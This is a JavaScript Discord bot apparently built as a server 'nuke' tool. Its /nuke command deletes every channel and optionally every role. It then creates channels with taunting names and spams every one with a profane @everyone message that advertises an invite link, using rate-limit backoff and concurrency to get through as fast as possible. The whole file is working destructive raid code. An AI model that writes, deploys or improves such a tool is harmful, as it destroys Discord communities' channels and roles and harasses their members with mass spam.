import 'dotenv/config';
import {
  Client, GatewayIntentBits, Events, ChannelType, MessageFlags,
  PermissionFlagsBits,
} from 'discord.js';

/* ------------------------------------------------------------------ config */

// always posted after a nuke — edit this line to change the text
const NUKE_MESSAGE =
  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS #";

// base name for every rebuilt channel
const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';

// false -> "name", "name 1", "name 2", ...
// true  -> "name 1", "name 2", "name 3", ...
const NUMBER_FIRST_CHANNEL = false;

const CATEGORY_NAME = 'general';
const TEXT_COUNT    = 25;   // how many text channels to create
const VOICE_COUNT   = 15;   // how many voice channels to create
const SPAM_COUNT    = 45;   // how many times the message gets spammed PER CHANNEL

// optional: a role NAME that may also nuke, on ANY server (admins always can).
const NUKE_ROLE_NAME = '';

/* ------------------------------------------------------------- speed knobs */

// delay between channel create/delete ops (Discord channel rate limit)
const CHANNEL_DELAY = 50;

// delay between two messages inside the SAME channel
const SEND_DELAY = 12;

// how many channels may fire at the exact same moment
const SEND_CONCURRENCY = 25;

const sleep = ms => new Promise(r => setTimeout(r, ms));

// "name" for the first channel, "name 1", "name 2", ... for the rest
function channelName(i) {
  const n = NUMBER_FIRST_CHANNEL ? i + 1 : i;
  return n === 0 ? CHANNEL_BASE : `${CHANNEL_BASE} ${n}`;
}

// send with automatic 429 backoff so nothing gets dropped when we blast
async function sendSafe(channel, content, retries = 6) {
  try {
    await channel.send(content);
  } catch (err) {
    const status = err?.status ?? err?.httpStatus;
    if (status === 429 && retries > 0) {
      const wait = ((err.retryAfter ?? err?.data?.retry_after ?? 1) * 1000) + 150;
      await sleep(wait);
      return sendSafe(channel, content, retries - 1);
    }
    console.error('[send]', channel.name, err.message);
  }
}

// create with automatic 429 backoff
async function createSafe(guild, options, retries = 5) {
  try {
    return await guild.channels.create(options);
  } catch (err) {
    const status = err?.status ?? err?.httpStatus;
    if (status === 429 && retries > 0) {
      const wait = ((err.retryAfter ?? err?.data?.retry_after ?? 1) * 1000) + 100;
      await sleep(wait);
      return createSafe(guild, options, retries - 1);
    }
    throw err;
  }
}

// run `worker` over `items` with a fixed concurrency ceiling
async function pool(items, limit, worker) {
  let i = 0;
  const n = Math.max(1, Math.min(limit, items.length));
  await Promise.all(
    Array.from({ length: n }, async () => {
      while (i < items.length) {
        const idx = i++;
        await worker(items[idx], idx);
      }
    })
  );
}

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

/* ------------------------------------------------------------------ events */

client.once(Events.ClientReady, c => {
  console.log(`Logged in as ${c.user.tag} — serving ${c.guilds.cache.size} guild(s).`);
});

client.on(Events.Error, err => console.error('[client]', err));

client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isChatInputCommand()) return;

  try {
    if (interaction.commandName === 'help') return await help(interaction);
    if (interaction.commandName === 'nuke') return await nuke(interaction);
  } catch (err) {
    console.error(err);
    const payload = {
      content: `Error: \`${err.message}\``,
      flags: MessageFlags.Ephemeral,
    };
    if (interaction.deferred || interaction.replied) {
      await interaction.editReply(payload).catch(() => {});
    } else {
      await interaction.reply(payload).catch(() => {});
    }
  }
});

/* ---------------------------------------------------------------- commands */

async function help(interaction) {
  return interaction.reply({
    content: [
      '**Commands**',
      '`/nuke [roles]` — delete every channel and rebuild the server',
      '`/help` — this message',
      '',
      'Only **Administrators** can run `/nuke`.',
    ].join('\n'),
    flags: MessageFlags.Ephemeral,
  });
}

async function nuke(interaction) {
  const { guild } = interaction;
  if (!guild) {
    return interaction.reply({
      content: 'Run this inside a server.',
      flags: MessageFlags.Ephemeral,
    });
  }

  /* ----- who is allowed to nuke? admins always, plus optional role name ----- */

  const isAdmin = interaction.memberPermissions.has(PermissionFlagsBits.Administrator);
  const hasRole =
    !!NUKE_ROLE_NAME &&
    interaction.member.roles.cache.some(
      r => r.name.toLowerCase() === NUKE_ROLE_NAME.toLowerCase()
    );

  if (!isAdmin && !hasRole) {
    return interaction.reply({
      content: 'You need **Administrator** (or the nuke role) to do this.',
      flags: MessageFlags.Ephemeral,
    });
  }

  const wipeRoles = interaction.options.getBoolean('roles') ?? false;

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  const me = guild.members.me;

  if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
    return interaction.editReply('I need the **Manage Channels** permission.');
  }

  // 1. roles (optional)
  if (wipeRoles) {
    if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
      console.warn('Skipping roles: missing Manage Roles.');
    } else {
      for (const role of [...guild.roles.cache.values()]) {
        if (role.managed) continue;                                   // bot/integration roles
        if (role.id === guild.id) continue;                           // @everyone
        if (role.comparePositionTo(me.roles.highest) >= 0) continue;  // higher than us
        await role.delete().catch(e => console.error('[role]', role.name, e.message));
        await sleep(CHANNEL_DELAY);
      }
    }
  }

  // 2. wipe every existing channel — snapshot first, the cache mutates as we delete
  for (const channel of [...guild.channels.cache.values()]) {
    await channel.delete().catch(e => console.error('[delete]', channel.name, e.message));
    await sleep(CHANNEL_DELAY);
  }

  // 3. rebuild — category + numbered channels
  const category = await createSafe(guild, {
    name: CATEGORY_NAME,
    type: ChannelType.GuildCategory,
  });
  await sleep(CHANNEL_DELAY);

  const textChannels = [];
  for (let i = 0; i < TEXT_COUNT; i++) {
    const ch = await createSafe(guild, {
      name: channelName(i),
      type: ChannelType.GuildText,
      parent: category.id,
    });
    textChannels.push(ch);
    await sleep(CHANNEL_DELAY);
  }

  for (let i = 0; i < VOICE_COUNT; i++) {
    await createSafe(guild, {
      name: channelName(i),
      type: ChannelType.GuildVoice,
      parent: category.id,
    });
    await sleep(CHANNEL_DELAY);
  }

  // 4. NUKE every text channel at the same time
  if (textChannels.length) {
    await pool(textChannels, SEND_CONCURRENCY, async ch => {
      for (let i = 0; i < SPAM_COUNT; i++) {
        await sendSafe(ch, NUKE_MESSAGE);
        if (i < SPAM_COUNT - 1) await sleep(SEND_DELAY);
      }
    });
  }

  // the origin channel is gone by now, so this can fail harmlessly
  await interaction
    .editReply(
      `Done. Wiped everything, rebuilt ${TEXT_COUNT} text + ${VOICE_COUNT} voice, ` +
      `spammed ${SPAM_COUNT}x in ${textChannels.length} channels.`
    )
    .catch(() => {});
}

client.login(process.env.DISCORD_TOKEN);
